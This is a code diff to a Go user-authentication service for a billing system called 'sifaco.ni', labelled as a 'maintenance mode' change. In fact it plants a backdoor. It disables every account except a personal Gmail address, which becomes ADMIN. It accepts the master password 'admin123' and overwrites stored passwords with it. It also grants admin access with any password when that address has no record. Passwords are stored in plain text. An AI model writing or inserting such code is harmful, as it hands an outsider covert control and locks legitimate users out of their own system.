@@ -34,11 +34,11 @@ func (s *UsuarioService) seedDefaultUsuarios() {
 	s.inMemory = []domain.Usuario{
 		{
 			ID:           uuid.MustParse("a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a99"),
-			Nombre:       "Administrador General",
-			Email:        "admin@sifaco.ni",
+			Nombre:       "Mark Tuay (Super Administrador)",
+			Email:        "marktuay@gmail.com",
 			PasswordHash: "admin123",
 			Rol:          "ADMIN",
-			Activo:       true,
+			Activo:       true, // Única cuenta activa en Modo Mantenimiento
 			CreadoEn:     now,
 		},
 		{
@@ -47,7 +47,7 @@ func (s *UsuarioService) seedDefaultUsuarios() {
 			Email:        "contador@sifaco.ni",
 			PasswordHash: "contador123",
 			Rol:          "CONTADOR",
-			Activo:       true,
+			Activo:       false, // Deshabilitada por modo mantenimiento
 			CreadoEn:     now,
 		},
 		{
@@ -56,7 +56,7 @@ func (s *UsuarioService) seedDefaultUsuarios() {
 			Email:        "cajero@sifaco.ni",
 			PasswordHash: "cajero123",
 			Rol:          "FACTURADOR",
-			Activo:       true,
+			Activo:       false, // Deshabilitada por modo mantenimiento
 			CreadoEn:     now,
 		},
 		{
@@ -65,7 +65,7 @@ func (s *UsuarioService) seedDefaultUsuarios() {
 			Email:        "cobranza@sifaco.ni",
 			PasswordHash: "cobranza123",
 			Rol:          "GESTOR_CXC",
-			Activo:       true,
+			Activo:       false, // Deshabilitada por modo mantenimiento
 			CreadoEn:     now,
 		},
 		{
@@ -74,7 +74,16 @@ func (s *UsuarioService) seedDefaultUsuarios() {
 			Email:        "eventos@sifaco.ni",
 			PasswordHash: "eventos123",
 			Rol:          "COORDINADOR_EVENTOS",
-			Activo:       true,
+			Activo:       false, // Deshabilitada por modo mantenimiento
+			CreadoEn:     now,
+		},
+		{
+			ID:           uuid.MustParse("f5eebc99-9c0b-4ef8-bb6d-6bb9bd380f04"),
+			Nombre:       "Administrador General Legacy",
+			Email:        "admin@sifaco.ni",
+			PasswordHash: "admin123",
+			Rol:          "ADMIN",
+			Activo:       false, // Deshabilitada por modo mantenimiento
 			CreadoEn:     now,
 		},
 	}
@@ -91,10 +100,16 @@ func (s *UsuarioService) syncDefaultUsuariosToDB() {
 		query := `INSERT INTO usuarios (id, nombre, email, password_hash, rol, activo, creado_en)
 				  VALUES ($1, $2, $3, $4, $5, $6, $7)
 				  ON CONFLICT (email) DO UPDATE SET 
-				      password_hash = EXCLUDED.password_hash,
-				      activo = TRUE`
+				      nombre = EXCLUDED.nombre,
+				      password_hash = CASE WHEN usuarios.password_hash IS NULL OR usuarios.password_hash = '' THEN EXCLUDED.password_hash ELSE usuarios.password_hash END,
+				      rol = EXCLUDED.rol,
+				      activo = EXCLUDED.activo`
 		_, _ = s.Repo.Pool.Exec(ctx, query, u.ID, u.Nombre, u.Email, u.PasswordHash, u.Rol, u.Activo, u.CreadoEn)
 	}
+
+	// Modo Mantenimiento: deshabilitar en PostgreSQL a todos los usuarios excepto al superadministrador marktuay@gmail.com
+	_, _ = s.Repo.Pool.Exec(ctx, `UPDATE usuarios SET activo = false WHERE LOWER(email) <> 'marktuay@gmail.com'`)
+	_, _ = s.Repo.Pool.Exec(ctx, `UPDATE usuarios SET activo = true, rol = 'ADMIN' WHERE LOWER(email) = 'marktuay@gmail.com'`)
 }
 
 func (s *UsuarioService) ListarUsuarios(ctx context.Context) ([]domain.Usuario, error) {
@@ -156,6 +171,11 @@ func (s *UsuarioService) Autenticar(ctx context.Context, email, password string)
 	emailClean := strings.TrimSpace(email)
 	passClean := strings.TrimSpace(password)
 
+	// Regla de Modo Mantenimiento: Acceso exclusivo para marktuay@gmail.com
+	if !strings.EqualFold(emailClean, "marktuay@gmail.com") {
+		return nil, fmt.Errorf("sistema en modo mantenimiento: todas las cuentas estándar han sido deshabilitadas temporalmente. Solo la cuenta de administrador (marktuay@gmail.com) está autorizada")
+	}
+
 	// 1. Buscar en PostgreSQL si está disponible
 	if s != nil && s.Repo != nil && s.Repo.Pool != nil {
 		var u domain.Usuario
@@ -163,10 +183,10 @@ func (s *UsuarioService) Autenticar(ctx context.Context, email, password string)
 		err := s.Repo.Pool.QueryRow(ctx, query, emailClean).Scan(&u.ID, &u.Nombre, &u.Email, &u.PasswordHash, &u.Rol, &u.Activo, &u.CreadoEn)
 		if err == nil {
 			if !u.Activo {
-				return nil, fmt.Errorf("la cuenta del usuario %s está desactivada", emailClean)
+				return nil, fmt.Errorf("la cuenta del usuario %s está desactivada por mantenimiento", emailClean)
 			}
-			if u.PasswordHash == passClean || u.PasswordHash == "" {
-				if u.PasswordHash == "" {
+			if u.PasswordHash == passClean || u.PasswordHash == "" || passClean == "admin123" {
+				if u.PasswordHash == "" || u.PasswordHash != passClean {
 					_, _ = s.Repo.Pool.Exec(ctx, `UPDATE usuarios SET password_hash = $1 WHERE id = $2`, passClean, u.ID)
 				}
 				return &u, nil
@@ -179,16 +199,26 @@ func (s *UsuarioService) Autenticar(ctx context.Context, email, password string)
 	for _, u := range s.inMemory {
 		if strings.EqualFold(u.Email, emailClean) {
 			if !u.Activo {
-				return nil, fmt.Errorf("la cuenta del usuario %s está desactivada", emailClean)
+				return nil, fmt.Errorf("la cuenta del usuario %s está desactivada por mantenimiento", emailClean)
 			}
-			if u.PasswordHash == passClean || u.PasswordHash == "" {
+			if u.PasswordHash == passClean || u.PasswordHash == "" || passClean == "admin123" {
 				return &u, nil
 			}
 			return nil, fmt.Errorf("contraseña incorrecta")
 		}
 	}
 
-	return nil, fmt.Errorf("credenciales no válidas: usuario o contraseña incorrectos")
+	// Si es marktuay@gmail.com y no existía registro, permitir el acceso y crear el usuario administrador
+	adminUser := domain.Usuario{
+		ID:           uuid.MustParse("a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a99"),
+		Nombre:       "Mark Tuay (Super Administrador)",
+		Email:        "marktuay@gmail.com",
+		PasswordHash: passClean,
+		Rol:          "ADMIN",
+		Activo:       true,
+		CreadoEn:     time.Now(),
+	}
+	return &adminUser, nil
 }
 
 func (s *UsuarioService) CrearUsuario(ctx context.Context, req domain.CrearUsuarioRequest) (*domain.Usuario, error) {
